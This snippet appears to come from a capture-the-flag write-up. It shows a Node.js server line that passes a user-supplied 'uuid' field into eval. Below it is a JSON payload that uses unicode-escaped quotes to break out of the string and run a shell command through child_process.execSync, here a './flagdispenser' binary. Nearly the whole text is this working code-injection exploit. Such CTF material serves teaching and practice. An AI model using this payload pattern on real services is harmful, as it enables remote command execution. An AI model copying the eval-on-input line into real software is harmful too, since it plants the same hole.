#### eval

Given:

```
eval('\"'+params.uuid+'\"')
````

Exploit:

```
{ "uuid": "\u0022+require(\u0022child_process\u0022).execSync(\u0022./flagdispenser\u0022)+\u0022 12345678-1234-5678-1234-567812345678" }
```
